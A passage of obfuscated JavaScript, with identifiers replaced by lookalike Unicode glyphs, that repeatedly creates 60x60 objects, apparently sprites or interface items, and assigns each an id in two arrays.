			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⲆΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃΔΔΔⵠΔ], ᐃⲆΔⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⲆΔⲆ].id = ᐃᐃ.ⲆⵠⲆΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⵠⵠΔⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆᐃᐃ].id = ᐃᐃ.ΔⵠⲆᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆΔᐃⲆⲆᐃ], ⲆⲆΔⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆⲆⵠ].id = ᐃᐃ.ⵠⲆⲆⲆⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆⲆⵠ].info.ᐃⵠ[2] = this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆⲆⵠ].info.ᐃⵠ[0];
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⲆᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠᐃⲆΔᐃⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔⲆᐃᐃ].id = ᐃᐃ.ΔΔⲆᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠᐃΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠⵠΔΔⵠΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠᐃΔⲆ].id = ᐃᐃ.ΔⵠᐃΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆΔΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃⵠⲆⲆⲆᐃ], ⲆΔⵠⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆΔΔⵠ].id = ᐃᐃ.ᐃⲆΔΔⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃΔᐃⵠⲆᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆⵠⵠ].id = ᐃᐃ.ⵠⲆⲆⵠⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔΔⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠⲆᐃΔΔΔ], ΔΔⵠΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔΔⲆᐃ].id = ᐃᐃ.ⲆΔΔⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠΔΔᐃⲆΔ], ΔΔᐃΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔⵠΔⲆ].id = ᐃᐃ.ⲆΔⵠΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔΔΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⲆⲆⵠⲆᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔΔΔΔ].id = ᐃᐃ.ᐃΔΔΔΔ;
			this.ᐃⵠᐃ[ᐃᐃ.Ⲇⵠᐃᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠⵠΔΔⵠΔ], ΔⲆᐃⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.Ⲇⵠᐃᐃⵠ].id = ᐃᐃ.Ⲇⵠᐃᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⲆᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⲆᐃᐃΔΔ], ⵠⵠⵠᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⲆᐃᐃ].id = ᐃᐃ.ⲆⲆⲆᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⲆᐃᐃ].info.ᐃⵠ[2] = this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⲆᐃᐃ].info.ᐃⵠ[0];
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⵠⵠᐃΔⲆ], ᐃⲆᐃᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔⲆᐃ].id = ᐃᐃ.ⲆⵠΔⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔⲆᐃ].info.ᐃⵠ[Δⵠⵠⵠ] = this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠΔⲆᐃ].info.ᐃⵠ[Ⲇᐃᐃᐃ];
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃΔⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆᐃᐃⲆⵠᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃΔⲆⲆ].id = ᐃᐃ.ⵠᐃΔⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠⲆⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃⲆⲆⲆⲆⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠⲆⲆΔ].id = ᐃᐃ.ᐃⵠⲆⲆΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠⲆⲆΔ].info.ᐃⵠ[ΔⵠⵠΔ] = this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠⲆⲆΔ].info.ᐃⵠ[ΔᐃΔΔ];
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠᐃⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⲆᐃⵠᐃⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠᐃⲆⵠ].id = ᐃᐃ.ⲆⵠᐃⲆⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆᐃΔᐃᐃⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆⵠⵠ].id = ᐃᐃ.ΔⵠⲆⵠⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⲆⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⲆᐃᐃ], ⲆⲆΔⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⲆⲆⵠ].id = ᐃᐃ.ⵠᐃⲆⲆⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆⲆᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠΔΔΔᐃⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆⲆᐃⲆ].id = ᐃᐃ.ᐃⲆⲆᐃⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⵠΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆΔⲆⵠⵠΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⵠΔⵠ].id = ᐃᐃ.ⵠⵠⵠΔⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⵠΔⵠ].info.ᐃⵠ[2] = this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⵠΔⵠ].info.ᐃⵠ[ΔⲆⵠⲆ];
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃΔᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⲆⲆⲆⲆⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃΔᐃᐃ].id = ᐃᐃ.ⲆᐃΔᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃΔᐃᐃ].info.ᐃⵠ[ⲆⵠΔΔ] = this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃΔᐃᐃ].info.ᐃⵠ[ᐃⵠⲆ];
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⲆΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃⵠⲆᐃᐃ], ΔΔⵠΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⲆΔᐃ].id = ᐃᐃ.ΔⲆⲆΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⵠⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⵠᐃ], ᐃᐃⲆΔⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⵠⲆᐃ].id = ᐃᐃ.ⵠⲆⵠⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔᐃⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠⲆΔΔⲆⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔᐃⲆⲆ].id = ᐃᐃ.ⵠΔᐃⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔᐃⲆⲆ].info.ᐃⵠ[2] = this.ᐃⵠᐃ[ᐃᐃ.ⵠΔᐃⲆⲆ].info.ᐃⵠ[0];
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔᐃᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠΔⵠΔⲆᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔᐃᐃᐃ].id = ᐃᐃ.ΔΔᐃᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔᐃᐃᐃ].info.ᐃⵠ[ⲆⲆΔᐃ] = this.ᐃⵠᐃ[ᐃᐃ.ΔΔᐃᐃᐃ].info.ᐃⵠ[ⲆΔⵠ];
			this.ᐃⵠᐃ[ᐃᐃ.Ⲇⵠᐃⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔᐃⲆⵠΔⵠ], ⵠᐃⵠⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.Ⲇⵠᐃⵠⵠ].id = ᐃᐃ.Ⲇⵠᐃⵠⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⵠᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⵠⲆΔⵠΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⵠᐃⵠ].id = ᐃᐃ.ΔⲆⵠᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⵠᐃⵠ].info.ᐃⵠ[2] = this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⵠᐃⵠ].info.ᐃⵠ[0];
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃᐃᐃⵠᐃⵠ], ⲆᐃΔᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆᐃᐃ].id = ᐃᐃ.ΔᐃⲆᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆᐃᐃ].info.ᐃⵠ[2] = this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆᐃᐃ].info.ᐃⵠ[ᐃⵠⲆⵠ];
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔⵠⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⵠⵠᐃⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔⵠⲆⲆ].id = ᐃᐃ.ᐃΔⵠⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆΔᐃⲆᐃⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔⵠΔ].id = ᐃᐃ.ᐃᐃΔⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔⵠΔ].info.ᐃⵠ[2] = this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔⵠΔ].info.ᐃⵠ[0];
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃᐃΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠⲆᐃΔΔⲆ], ⵠⵠⵠᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃᐃΔΔ].id = ᐃᐃ.ΔᐃᐃΔΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠᐃΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔᐃΔⲆⲆⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠᐃΔΔ].id = ᐃᐃ.ⲆⵠᐃΔΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆΔⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃᐃᐃΔⲆΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆΔⲆᐃ].id = ᐃᐃ.ⲆⲆΔⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⵠᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃᐃΔᐃᐃⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⵠᐃⲆ].id = ᐃᐃ.ΔⲆⵠᐃⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆΔⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠΔⵠᐃᐃⵠ], ⵠⵠⵠᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆΔⵠΔ].id = ᐃᐃ.ΔⲆΔⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔⲆᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠⲆᐃⲆⵠΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔⲆᐃⲆ].id = ᐃᐃ.ᐃΔⲆᐃⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃᐃΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠⲆⲆΔⲆⲆ], ⵠΔΔΔΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃᐃΔᐃ].id = ᐃᐃ.ΔᐃᐃΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⵠⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⵠΔⵠⲆⲆ], ΔⲆᐃⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⵠⵠΔ].id = ᐃᐃ.ΔⵠⵠⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.Δⵠⵠⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃΔᐃΔΔⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.Δⵠⵠⵠⵠ].id = ᐃᐃ.Δⵠⵠⵠⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆᐃΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃΔⵠΔᐃⵠ], ΔⲆΔᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆᐃΔⵠ].id = ᐃᐃ.ΔⲆᐃΔⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠᐃⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠⵠⲆᐃΔᐃ], ⲆⲆΔⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠᐃⲆᐃ].id = ᐃᐃ.ᐃⵠᐃⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠΔⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆΔⲆᐃΔⲆ], ᐃᐃⲆΔⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠΔⲆⵠ].id = ᐃᐃ.ⵠⵠΔⲆⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⵠΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⵠΔᐃΔⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⵠΔΔ].id = ᐃᐃ.ⲆⲆⵠΔΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔΔⲆᐃΔΔ], ΔΔⵠΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⲆⵠⲆ].id = ᐃᐃ.ⵠⲆⲆⵠⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔⵠΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⲆᐃⵠΔⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔⵠΔⵠ].id = ᐃᐃ.ⲆΔⵠΔⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⲆᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆΔᐃΔΔⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⲆᐃⵠ].id = ᐃᐃ.ⵠΔⲆᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠᐃⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⵠΔΔᐃᐃ], ᐃⲆΔⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠᐃⵠⲆ].id = ᐃᐃ.ⵠⵠᐃⵠⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠᐃΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠΔⵠᐃⵠΔ], ⲆΔⵠⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠᐃΔΔ].id = ᐃᐃ.ᐃⵠᐃΔΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⲆᐃⵠⵠⲆ], ᐃᐃⵠⲆᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆᐃⵠ].id = ᐃᐃ.ΔᐃⲆᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆΔⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃΔⵠⲆᐃⲆ], ᐃᐃⵠⲆᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆΔⲆΔ].id = ᐃᐃ.ⵠⲆΔⲆΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⲆᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠⲆΔᐃᐃⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⲆᐃΔ].id = ᐃᐃ.ⵠΔⲆᐃΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆⲆᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆᐃΔΔΔⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆⲆᐃⵠ].id = ᐃᐃ.ᐃⲆⲆᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔⵠⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔⲆⵠᐃⲆⲆ], ΔⲆᐃⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔⵠⵠⲆ].id = ᐃᐃ.ᐃΔⵠⵠⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔΔᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔΔᐃΔΔⵠ], ΔⲆΔᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔΔΔᐃⲆ].id = ᐃᐃ.ΔΔΔᐃⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃᐃⲆⵠⲆⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆⲆΔ].id = ᐃᐃ.ΔᐃⲆⲆΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠᐃⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⲆᐃⵠᐃΔ], ΔᐃⲆΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠᐃⲆᐃ].id = ᐃᐃ.ⵠⵠᐃⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠᐃⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⲆᐃⵠΔᐃ], Δⵠᐃⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠᐃⲆⲆ].id = ᐃᐃ.ΔⵠᐃⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆΔⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆⵠⲆᐃᐃᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆΔⵠⵠ].id = ᐃᐃ.ΔⲆΔⵠⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔᐃⵠΔᐃΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⵠΔⲆ].id = ᐃᐃ.ⲆⲆⵠΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⵠᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆᐃⵠⲆⵠΔ], ΔΔⵠΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⵠᐃⵠ].id = ᐃᐃ.ⲆⲆⵠᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠⲆΔΔⲆᐃ], ΔⲆΔᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆΔⵠ].id = ᐃᐃ.ΔⵠⲆΔⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠᐃΔⲆⲆΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔⲆΔ].id = ᐃᐃ.ᐃᐃΔⲆΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔΔΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔⵠᐃⵠⲆⵠ], ΔⲆΔᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃΔΔΔⵠ].id = ᐃᐃ.ᐃΔΔΔⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⲆⲆΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃΔⵠⵠᐃΔ], ΔⲆᐃⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆⲆⲆΔ].id = ᐃᐃ.ⲆⲆⲆⲆΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⲆⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠΔⲆΔΔΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⲆⲆⲆⲆ].id = ᐃᐃ.ΔⲆⲆⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆⲆⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃᐃⵠᐃⵠΔ], Δⵠᐃⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⲆⲆⲆᐃ].id = ᐃᐃ.ᐃⲆⲆⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⵠᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⵠⲆⲆᐃΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆⵠᐃⲆ].id = ᐃᐃ.ⵠⲆⵠᐃⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⲆⲆⵠᐃΔ], ⲆⲆΔⲆ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃⲆⵠⲆ].id = ᐃᐃ.ΔᐃⲆⵠⲆ;
			this.ⵠⵠⲆ = [];
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⵠΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠᐃⵠⵠⲆᐃ], ⲆᐃΔᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⵠΔᐃ].id = ᐃᐃⲆ.ⲆᐃⵠΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠᐃⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃᐃⲆⵠᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠᐃⵠΔ].id = ᐃᐃⲆ.ⲆⵠᐃⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆΔᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔΔⲆᐃΔⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆΔᐃΔ].id = ᐃᐃⲆ.ⵠⲆΔᐃΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⲆⲆΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃᐃⵠᐃⲆΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⲆⲆΔᐃ].id = ᐃᐃⲆ.ᐃⲆⲆΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔΔⵠᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆᐃⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔΔⵠᐃ].id = ᐃᐃⲆ.ⲆΔΔⵠᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠⵠΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔΔΔⲆᐃΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠⵠΔⲆ].id = ᐃᐃⲆ.ⵠⵠⵠΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⵠᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔᐃΔⲆⲆⵠ], ⲆⲆΔⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⵠᐃΔ].id = ᐃᐃⲆ.ⵠΔⵠᐃΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔⲆⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆΔᐃⲆⲆⲆ], ⵠⲆΔⵠΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔΔⲆⵠⲆ].id = ᐃᐃⲆ.ΔΔⲆⵠⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆⲆΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⵠⵠᐃⵠⲆ], ᐃᐃⵠⲆᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆⲆΔⲆ].id = ᐃᐃⲆ.ⵠⲆⲆΔⲆ;
